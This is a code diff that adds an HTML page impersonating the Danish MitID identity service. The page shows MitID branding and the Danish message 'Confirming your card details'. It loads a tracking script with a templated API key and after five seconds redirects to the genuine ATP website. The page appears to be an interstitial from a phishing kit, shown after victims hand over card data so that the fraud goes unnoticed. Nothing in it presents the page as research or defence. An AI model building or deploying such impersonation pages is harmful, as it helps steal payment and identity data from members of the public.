@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MitID</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: #fff;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    min-height: 100vh;
+  }
+  .loading-logo { margin-bottom: 32px; }
+  .shield-wrap {
+    position: relative;
+    width: 120px;
+    height: 120px;
+    margin-bottom: 24px;
+  }
+  .spinner-ring {
+    width: 52px;
+    height: 52px;
+    position: absolute;
+    top: 34px;
+    left: 34px;
+    animation: spin 1.2s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loading-title {
+    font-size: 19px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin: 0 0 8px;
+    font-family: 'Segoe UI', Arial, sans-serif;
+  }
+  .loading-sub {
+    font-size: 15px;
+    color: #6b7280;
+    margin: 0;
+    font-family: 'Segoe UI', Arial, sans-serif;
+  }
+</style>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+  <div class="loading-logo">
+    <img src="assets/mitidlogo.webp" alt="MitID" style="height:38px;width:auto;">
+  </div>
+  <div class="shield-wrap">
+    <img src="assets/shield.png" style="width:120px;height:120px;position:absolute;top:0;left:0;" alt="">
+    <svg class="spinner-ring" viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="26" cy="26" r="20" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="3"/>
+      <circle cx="26" cy="26" r="20" fill="none" stroke="white" stroke-width="3" stroke-dasharray="31 95" stroke-linecap="round"/>
+    </svg>
+  </div>
+  <p class="loading-title">Bekræfter dine kortoplysninger</p>
+  <p class="loading-sub">Vent et øjeblik ...</p>
+  <script>
+    setTimeout(function() {
+      window.location.href = 'https://www.atp.dk';
+    }, 5000);
+  </script>
+</body>
+</html>
